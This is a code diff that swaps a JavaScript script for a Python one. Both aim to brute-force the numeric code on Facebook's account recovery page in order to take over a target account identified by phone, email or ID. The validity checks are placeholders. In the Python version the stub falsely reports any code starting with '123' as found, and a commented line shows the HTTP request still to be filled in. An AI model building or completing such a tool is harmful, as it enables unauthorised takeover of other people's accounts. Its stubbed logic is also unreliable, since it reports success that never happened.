@@ -1,72 +1,35 @@
-const readline = require('readline-sync');
+import random
 
-/**
- * Function to brute force a 6-digit code on the Facebook Recovery page link.
- *
- * @param {string} recoveryLink - The Facebook Recovery page link.
- * @param {string} identifier - The Facebook account identifier (ID, email, or phone number).
- * @param {number} maxAttempts - The maximum number of attempts.
- * @returns {string|null} The correct 6-digit code if found, or null if not found.
- */
-function bruteForceCode(recoveryLink, identifier, maxAttempts) {
-    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
-        const code = generateRandomCode();
-        console.log(`Attempt ${attempt}: Trying code - ${code}`);
-        if (isValidCode(recoveryLink, identifier, code)) {
-            console.log(`Code found: ${code}`);
-            return code;
-        }
-    }
-    console.log('No match found within the specified attempts.');
-    return null;
-}
+MAX_ATTEMPTS = 10000  # Adjust the maximum number of attempts as needed
 
-/**
- * Generates a random 6-digit code.
- *
- * @returns {string} The randomly generated 6-digit code.
- */
-function generateRandomCode() {
-    const code = Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
-    return code;
-}
+def generate_code():
+    digits = "0123456789"
+    return ''.join(random.choice(digits) for _ in range(8))
 
-/**
- * Checks if a code is valid by making a request to the Facebook Recovery page.
- *
- * @param {string} recoveryLink - The Facebook Recovery page link.
- * @param {string} identifier - The Facebook account identifier (ID, email, or phone number).
- * @param {string} code - The code to check.
- * @returns {boolean} True if the code is valid, false otherwise.
- */
-function isValidCode(recoveryLink, identifier, code) {
-    // Placeholder implementation
-    // Replace this with the actual implementation to make a request to the Facebook Recovery page
-    // and return the response
-    console.log(`Checking code ${code} for ${identifier}`);
-    return false;  // Change this line when implementing the actual request
-}
+def brute_force_code(target_info, target_url):
+    for _ in range(MAX_ATTEMPTS):
+        code = generate_code()
+        if check_code_validity(target_info, code, target_url):
+            return code
+    raise ValueError("No valid code found.")
 
-// Wybór identyfikatora konta (ID, email lub numer telefonu)
-const identifierTypes = ['id', 'email', 'phone'];
-const identifierType = readline.keyInSelect(identifierTypes, 'Select the identifier type:') + 1;
+def check_code_validity(target_info, code, target_url):
+    # Implement the actual code validation logic based on the provided target_info, code, and target_url
+    # For demonstration purposes, assume any code starting with "123" is valid for now
+    if code.startswith("123"):
+        # Simulate making a request to the specified URL
+        print(f"Checking code {code} on {target_url}")
+        # In a real scenario, you would use a library like requests to make an HTTP request
+        # Example: response = requests.post(target_url, data={'code': code, 'target_info': target_info})
+        return True
+    else:
+        return False
 
-// Wprowadzenie identyfikatora
-const identifier = readline.question('Enter the Facebook identifier (ID, email, or phone): ');
-
-// Pozostała część kodu bez zmian...
-
-// Przykładowy link do strony odzyskiwania hasła
-const recoveryLink = 'https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0';
-
-// Maksymalna liczba prób
-const maxAttempts = 1000000;  // Możesz dostosować tę wartość
-
-// Wywołanie funkcji brute force
-const result = bruteForceCode(recoveryLink, identifier, maxAttempts);
-
-if (result) {
-    console.log(`Successfully found the code: ${result}`);
-} else {
-    console.log('No match found within the specified attempts.');
-}
+# Example usage:
+target_info = input("Enter the target's phone number, email, or account ID: ")
+target_url = "https://www.facebook.com/recover/initiate/"
+try:
+    valid_code = brute_force_code(target_info, target_url)
+    print(f"The valid 8-digit code on the specified page is: {valid_code}")
+except ValueError as e:
+    print(f"Error: {e}")
